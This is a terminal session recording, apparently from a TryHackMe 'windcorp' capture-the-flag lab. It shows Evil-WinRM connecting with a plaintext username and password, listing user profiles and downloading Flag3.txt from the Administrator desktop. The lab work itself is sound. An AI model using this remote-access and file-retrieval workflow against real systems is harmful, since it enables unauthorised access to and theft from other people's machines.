@@ -1,0 +1,113 @@
+Script started on 2025-04-10 12:05:54+03:00 [COMMAND="evil-winrm -i fire.windcorp.thm -u iobreaker -p 'P+ssword123'" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\iobreaker\Documents> whoami
+windcorp\iobreaker
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\iobreaker\Documents> cd ../..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/10/2020   4:18 AM                Administrator
+d-----         5/1/2020   5:59 AM                angrybird
+d-----         5/1/2020   5:59 AM                berg
+d-----         5/1/2020   5:59 AM                bluefrog579
+d-----        4/10/2025   1:58 AM                brittanycr
+d-----         5/1/2020   5:59 AM                brownostrich284
+d-----        4/10/2025  12:42 AM                buse
+d-----         5/1/2020   5:59 AM                edward
+d-----         5/2/2020   4:30 PM                freddy
+d-----         5/1/2020   5:59 AM                garys
+d-----        4/10/2025   2:06 AM                goldencat416
+d-----         5/1/2020   5:59 AM                goldenwol
+d-----         5/1/2020   5:59 AM                happ
+d-----         5/1/2020   5:59 AM                happyme
+d-----        4/10/2025   2:04 AM                iobreaker
+d-----         5/1/2020   5:59 AM                Luis
+d-----         5/1/2020   5:59 AM                orga
+d-----         5/1/2020   5:59 AM                organicf
+d-----        4/10/2025   2:02 AM                organicfish718
+d-----         5/1/2020   5:59 AM                pete
+d-r---        4/30/2020   7:35 AM                Public
+d-----         5/1/2020   5:59 AM                purplecat
+d-----         5/1/2020   5:59 AM                purplepanda
+d-----         5/1/2020   5:59 AM                sadswan
+d-----        4/10/2025   2:05 AM                sadswan869
+d-----         5/1/2020   5:59 AM                sheela
+d-----         5/1/2020   5:59 AM                silver
+d-----         5/1/2020   5:59 AM                smallf
+d-----         5/1/2020   5:59 AM                spiff
+d-----         5/1/2020   5:59 AM                tinygoos
+d-----         5/1/2020   5:59 AM                whiteleopard
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users> cd Administrator
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/8/2020   8:25 AM                .docker
+d-r---        4/30/2020   7:56 AM                3D Objects
+d-r---        4/30/2020   7:56 AM                Contacts
+d-r---        5/10/2020   4:17 AM                Desktop
+d-r---         5/1/2020   1:57 AM                Documents
+d-r---        5/29/2020   5:44 PM                Downloads
+d-r---        4/30/2020   7:56 AM                Favorites
+d-r---        4/30/2020   7:56 AM                Links
+d-r---        4/30/2020   7:56 AM                Music
+d-r---        4/30/2020   7:56 AM                Pictures
+d-r---        4/30/2020   7:56 AM                Saved Games
+d-r---        4/30/2020   7:56 AM                Searches
+d-r---        4/30/2020   7:56 AM                Videos
+-a----         5/1/2020   2:05 AM            146 .sparkExt.properties
+-a----         5/1/2020   2:44 AM            315 sip-communicator.properties
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> cd Desktop
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/7/2020   1:22 AM             47 Flag3.txt
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> get "Flag 3.txt"
+The term 'get' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ get "Flag 3.txt"
++ ~~~
+    + CategoryInfo          : ObjectNotFound: (get:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> downlod[55G[Kad "Flag 3.txt3[69G[K"
+                                        
+[0;34mInfo: Downloading C:\Users\Administrator\Desktop\Flag 3.txt to Flag 3.txt[0m
+                                        
+[0;31mError: Download failed. Check filenames or paths[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> download fL[59G[K[58G[KFlga3[62G[K[61G[K[60G[Kag3.txt
+                                        
+[0;34mInfo: Downloading C:\Users\Administrator\Desktop\Flag3.txt to Flag3.txt[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> exit
+                                        
+[0;34mInfo: Exiting with code 0[0m
+
+Script done on 2025-04-10 12:08:57+03:00 [COMMAND_EXIT_CODE="0"]
